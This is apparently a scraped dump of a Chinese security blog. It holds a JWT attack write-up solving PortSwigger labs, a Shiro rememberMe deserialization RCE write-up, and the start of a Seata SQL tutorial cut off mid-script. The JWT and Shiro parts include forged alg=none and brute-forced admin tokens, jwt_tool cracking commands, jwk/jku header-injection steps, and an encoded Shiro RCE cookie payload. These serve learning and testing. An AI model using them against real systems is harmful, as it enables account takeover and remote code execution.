生成JWT @Test public void TestJwt(){ Map\u0026lt;String, Object\u0026gt; claims = new HashMap\u0026lt;\u0026gt;(); claims.put(\u0026#34;id\u0026#34;,1); claims.put(\u0026#34;name\u0026#34;,\u0026#34;Lsec\u0026#34;); String jwt = Jwts.builder() .signWith(SignatureAlgorithm.HS256, \u0026#34;Lsec\u0026#34;) //签名算法 .setClaims(claims) //载荷 .setExpiration(new Date(System.currentTimeMillis() + 3600 * 1000)) //设置令牌有效期为1小时 .compact(); System.out.println(jwt); } // JWT令牌解析--还原JWT令牌数据 @Test public void testParseJwt(){ Claims lsec = Jwts.parser() .setSigningKey(\u0026#34;Lsec\u0026#34;) //密钥 .parseClaimsJws(\u0026#34;eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiTHNlYyIsImlkIjoxLCJleHAiOjE3MzE5NDY4ODZ9.WKZnuIlIKcOwaKIpt_pkQR5nIRtrDOByXyI8TCsJCcw\u0026#34;) .getBody(); System.out.println(lsec); } Jwt常出现的问题 https://portswigger.net/web-security/all-labs#jwt Burp靶场\nhttps://mp.weixin.qq.com/s/C1YDIKXOw7atNyefbe2TJg 靶场解题攻略\n通过未经验证的签名绕过 JWT 身份验证 使用wiener:peter进行登录，发现网站会返回JWT进行认证，使用JWT进行解密，替换sub字段\n直接修改字段网站可能会不显示，但是可以根据JWT的加密进行修改，payload部分有base64进行加密，只需要将payload部分提取出来进行解密即可\n访问删除连接成功删除用户\n通过有缺陷的签名验证绕过 JWT 身份验证 什么叫签名缺陷？有些JWT解密后确实存在加密算法，但是只需要将header中的alg更改为none即可绕过签名限制，将alg更改为none之后记得删除签名字段\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 GET /admin/delete?username=carlos HTTP/2 Host: 0a7400d804d7cc1e812212bc00bc00ed.web-security-academy.net Cookie: session=eyJraWQiOiI1NWJlZTNjNy04NjAxLTRhM2YtYjJjOC0xYzNiOTgwNmU4MTgiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5MDM4NSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers 通过弱签名密钥绕过 JWT 身份验证（爆破jwt密钥） 常见JWT爆破工具：jwt_tool 1 2 3 4 5 6 7 8 9 10 11 12 13 检查令牌的有效性测试已知漏洞： (CVE-2015-2951) alg=none签名绕过漏洞 (CVE-2016-10555) RS / HS256公钥不匹配漏洞 (CVE-2018-0114)密钥注入漏洞 (CVE-2019-20933/CVE-2020-28637)空白密码漏洞 (CVE-2020-28042)空签名漏洞 扫描错误配置或已知弱点 模糊声明值以引发意外行为 测试机密/密钥文件/公共密钥/ JWKS密钥的有效性通过高速字典攻击识别弱键 伪造新的令牌标头和有效载荷内容，并使用密钥或通过其他攻击方法创建新签名 时间戳篡改 RSA 和 ECDSA 密钥生成和重建（来自 JWKS 文件） 1 2 3 4 #爆破JWT -d 指定自定义字典 python jwt_tool.py eyJraWQiOiI1ZDY0YmNiYy0zMzUxLTQ1YmUtYjkxNS04YWY4ZmRmZTkyMmMiL CJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5MTgyMiwic3ViIjoi d2llbmVyIn0.HCINz9uNuMWbIYjWXV5oUI2adMDT9yz6ETofdBTXE6A -C -d jwt-secrets.txt 爆破出密钥为secret1，直接使用jwt.io在线编辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 GET /admin/delete?username=carlos HTTP/2 Host: 0a5e00f6036480bab9b18738008400b9.web-security-academy.net User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Sec-Websocket-Version: 13 Origin: https://0a5e00f6036480bab9b18738008400b9.web-security-academy.net Sec-Websocket-Key: JL91NnXespEIBGdR0it21A== Cookie: session=eyJraWQiOiI1ZDY0YmNiYy0zMzUxLTQ1YmUtYjkxNS04YWY4ZmRmZTkyMmMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5MTgyMiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.y4bodw8-TE3ImwJfCPMrR25Ax4l9CvKkOcEo55nhiz0 Sec-Fetch-Dest: empty Sec-Fetch-Mode: websocket Sec-Fetch-Site: same-origin Pragma: no-cache Cache-Control: no-cache Upgrade: websocket 通过 jwk 标头注入绕过 JWT 身份验证 JWT头部注入 如果服务器端使用一个非常脆弱的密钥，我们甚至有可能一个字符一个字符地来暴力破解这个密钥，根据JWS规范只有alg报头参数是强制的，然而在实践中JWT报头通常包含几个其他参数，以下是攻击者特别感兴趣的：\n1 2 3 jwk(JSON Web Key)：提供一个代表密钥的嵌入式JSON对象 jku(JSON Web Key Set URL)：提供一个URL，服务器可以从这个URL获取一组包含正确密钥的密钥 kid(密钥id)：提供一个ID，在有多个密钥可供选择的情况下服务器可以用它来识别正确的密钥，根据键的格式这可能有一个匹配的kid参数 下面我们介绍如何通过JWK参数注入自签名的JWT，JWS(JSON Web Signature)规范描述了一个可选的jwk header参数，服务器可以使用该参数以jwk格式将其公钥直接嵌入令牌本身，您可以在下面的JWT head中看到具体的示例\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;kid\u0026#34;: \u0026#34;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;jwk\u0026#34;: { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m\u0026#34; } } Burp靶场演示：Burp安装个JWT Editor插件\u0026mdash;生成一个New RSAKey\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;p\u0026#34;: \u0026#34;8J0fgpxQpZOvPGb2rRsJB6Bh0lgvxRtp_Ilc7NmpI3UgEUiArSey091pT3X6lIPRZLdMf_eeYo_PWh5aq79Ps_xoZHtAz4VrR9sR8tCkND-z0KKBmopkUrowJie368xoWDU53P-4qxEfCfqPPxoZZRzhE7cse0PUVayNAJC01FU\u0026#34;, \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;q\u0026#34;: \u0026#34;1zMkdJNLYEdZYvZ31B15CmCfI9dOGEpn6lyXOEBPsqrP554x_8dXZnXSHbybiYyeLgl6i_JubJBqjeSAejwHh9v-e3-R9-7Dgg4lB_OUNqsg7yM3mcpZn7IHeGVKj9BjhigWsbUXFuwM1iEDK4TDmTV4-tO9UMsIBQA1SFlUTA8\u0026#34;, \u0026#34;d\u0026#34;: \u0026#34;Ayw2AASn_yn6EwjqCts6_gP6NZ9BlNhCG1iuDTX9h_AGWYBtUepdgp4CaM098ZyjH2Da3RvonFVlTOwHTgVAdkb2eWqeMejMjUji3cKIQRU_r0UeY3C4q8BBuWjwzF7ZTeVDgbx05NfeUW0LwWE3mFBuPDy6tmvYdekcs8Ft7GDmU_ToPZaGnMoEKzVlMyDb82LgkB7qWw2H4UoXHWR0l_RS90gTjkJzMc4Fmu4CoPfmqw8jLnGgq8GhAzpecc-VLvqel3tSY0fKqF5Y3U2SooL27vJJxX0kLgHVbcTNvCcS8XZArdhWTekV923jtspoNDYn5HfhAlLglCcwQcOSYQ\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;fa018615-0392-4d15-89bb-a2c637d9adbd\u0026#34;, \u0026#34;qi\u0026#34;: \u0026#34;XO3HEFj8PCxFz4DIw0djHjTrW4Krm-Oim-U4bmuEdmPDKKTIYYvkPVoSRR-4kCHkCx2aDsraUbNkTyEYC4dRUbnWl6xr2HxaLZIsxOglYsa939l_m6NXSzttAGrPpWqoURT7t6ihSmBnGDJDsMS3c1gWJKZsAYkeXy5lI2IhGks\u0026#34;, \u0026#34;dp\u0026#34;: \u0026#34;0gfldIZsY0w5_9jE5LAfvreCDDGMaVsXtihVpC4PVXMs7clDAWMQ152DCqiqdi9mfar_LQkCCXkM_9ZVQWw675qZqXRpS3xj_BI_ZZw4aZ9dn_XqefLpxcjetL-g7US9pJm5i67xDOpiFLzRg7yNhFSkKCiRvHumAq8fWen23w0\u0026#34;, \u0026#34;dq\u0026#34;: \u0026#34;QcZI6zSmAjxsjrnkcDm96DUWDv9cyEHdtx0rvy6w7VwWBaYthA8qoI98dEhUhdsr8chF44Zqx9XwK4Re3H2Ck7zi8F5SgCRDL3ohSWfisj7l5xGtidz2PcBNVjgnbQN1l-ii3xgJgaEOX1hhvqhqnGZins-e-pXD0rt4ja93-3M\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w\u0026#34; } 抓包，将attack和sign都设置为新签名，修改payload越权到administrator即可\n通过 jku 标头注入绕过 JWT 身份验证 有些服务器可以使用jku(jwk Set URL)头参数来引用包含密钥的JWK集，而不是直接使用JWK头参数来嵌入公钥，当验证签名时，服务器从这个URL获取相关的密钥，这里的JWK集其实是一个JSON对象，包含一个代表不同键的JWK数组，下面是一个简单的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 { \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;75d0ef47-af89-47a9-9061-7c02a610d5ab\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ\u0026#34; }, { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw\u0026#34; } ] } 通过算法混淆绕过 JWT 身份验证 算法混淆攻击(也称为密钥混淆攻击)是指攻击者能够迫使服务器使用不同于网站开发人员预期的算法来验证JSON web令牌(JWT)的签名，这种情况如果处理不当，攻击者可能会伪造包含任意值的有效jwt而无需知道服务器的秘密签名密钥 JWT可以使用一系列不同的算法进行签名，其中一些，例如:HS256(HMAC+SHA-256)使用\u0026quot;对称\u0026quot;密钥，这意味着服务器使用单个密钥对令牌进行签名和验证，显然这需要像密码一样保密\n","date":"2025-06-10T22:40:26+08:00","image":"https://lserein.github.io/p/jwt%E6%94%BB%E9%98%B2/jwt_hu_e133807af62d3807.jpg","permalink":"https://lserein.github.io/p/jwt%E6%94%BB%E9%98%B2/","title":"JWT攻防"},{"content":"1.Shiro框架介绍 shiro反序列化详解（多个复现场景），看完就是赚到\nApache Shiro 是一个强大且灵活的安全框架，主要用于身份验证、授权、加密和会话管理。它可以帮助开发者轻松地实现用户权限控制，确保应用程序的安全性。\nApache Shiro反序列化漏洞分为两种：Shiro-550、Shiro-721\n2.漏洞产生原理 Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。 **在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 ** 那么，Payload产生的过程： 命令=\u0026gt;序列化=\u0026gt;AES加密=\u0026gt;base64编码=\u0026gt;RememberMe Cookie值 数据\u0026mdash;\u0026ndash;\u0026gt;序列化\u0026mdash;\u0026ndash;\u0026gt;aes加密\u0026mdash;\u0026mdash;\u0026gt;base64\u0026mdash;\u0026mdash;\u0026gt;存储再rememberMe中rememberMe\u0026mdash;\u0026mdash;\u0026ndash;\u0026gt;base64解码\u0026mdash;-\u0026gt;aes解密\u0026mdash;\u0026mdash;\u0026gt;反序列化 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。 3.漏洞影响版本 Shiro-550： Apache Shiro \u0026lt; 1.2.4\nShiro-721： Apache Shiro = 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1\n4.漏洞挖掘思路 4.1.黑盒挖掘 由于Shiro是一个身份验证，授权加密的框架，所以常出现点就是在登录框，在登录的时候抓包，看Cookie字段是否存在RememberMe等字段，或使用burp的一些被动扫描插件判断是否使用了Shiro框架\n当发现使用Shiro框架后，就可以使用一把梭工具进行测试是否存在Shiro漏洞\n爆破密钥，检测利用链\n1 2 3 4 5 6 7 8 9 10 GET / HTTP/1.1 Cookie: rememberMe=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 Authorization: Basic d2hvYW1p Accept: text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.8 Cookie: JSESSIONID=12D77B15B8ABEE32B592B283EB1D46AA Host: 192.168.165.252:8088 Connection: close 返回包内容为执行命令返回结果后base64加密的内容\n4.2.白盒挖掘 查看项目的pom.xml或依赖是否使用Shiro框架\nShiro版本是否是存在漏洞的版本，查看Shiro的AES加密密钥\nAES的密钥Key一般在项目的配置文件中，如果是默认的Key，那么项目的默认文件会找不到，而是在实现RememberMeManager的方法内，采用硬编码\n5.Shiro反序列化利用 5.1.Shiro550 影响版本：Apache Shiro \u0026lt; 1.2.4\n可以看到Shiro版本为1.2.4时，默认AES加密Key是硬编码在代码中的\n注意：如果手动打的话，要删除掉数据包中的sessionId，如果数据包中存在SessionId，那么就不会读取RememberMe\n5.2.Shiro721 Shiro-721： Apache Shiro = 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1\n但当Shiro版本为1.2.4以上时，AES加密Key采用随机生成的方式\n因为shiro721用到的加密方式是AES-CBC，而且其中的ase加密的key基本猜不到了，是系统随机生成的。而cookie解析过程跟cookie的解析过程一样，也就意味着如果能伪造恶意的rememberMe字段的值且目标含有可利用的攻击链的话，还是能够进行RCE的。\n使用工具进行爆破，发现爆破失败\nShiro721是使用 登录后rememberMe= {value}去爆破正确的key值 进而反序列化，shiro721 本质上是 padding attack，爆破要弄很久很久。对比Shiro550条件只要有 足够密钥库 （条件较低）、Shiro721需要登录（要求较高 ）。\n6.Shiro反序列化分析 shiro反序列化初入\n反序列化学习之路-Shiro550\n反序列化学习之路-Shiro-721 分析\n","date":"2025-06-10T15:06:06+08:00","image":"https://lserein.github.io/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Shiro_hu_97a7258629bde61d.jpg","permalink":"https://lserein.github.io/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Shiro反序列化"},{"content":"为什么要学习分布式事务Seata？ 场景：在微服务架构中，一个业务操作可能涉及多个服务的数据库（如订单服务、库存服务、支付服务），传统事务无法跨服务保证原子性（ACID 中的 Atomicity）。\nSeata 通过抽象事务协调、资源管理和模式支持，解决了微服务架构下分布式事务的核心痛点，帮助开发者在保证数据一致性的同时，兼顾性能和开发效率。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 CREATE DATABASE IF NOT EXISTS `storage_db`; USE `storage_db`; DROP TABLE IF EXISTS `storage_tbl`; CREATE TABLE `storage_tbl` ( `id` int(11) NOT NULL AUTO_INCREMENT, `commodity_code` varchar(255) DEFAULT NULL, `count` int(11) DEFAULT 0, PRIMARY KEY (`id`), UNIQUE KEY (`commodity_code`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; INSERT INTO storage_tbl (commodity_code, count) VALUES (\u0026#39;P0001\u0026#39;, 100); INSERT INTO storage_tbl (commodity_code, count) VALUES (\u0026#39;B1234\u0026#39;, 10); -- 注意此处0.3.0+ 增加唯一索引 ux_undo_log DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; CREATE DATABASE IF NOT EXISTS `order_db`; USE `order_db`; DROP TABLE IF EXISTS `order_tbl`; CREATE TABLE `order_tbl` ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` varchar(255) DEFAULT NULL, `commodity_code` varchar(255) DEFAULT NULL, `count` int(11) DEFAULT 0, `money` int(11) DEFAULT 0, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- 注意此处0.3.0+ 增加唯一索引 ux_undo_log DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; CREATE DATABASE IF NOT EXISTS 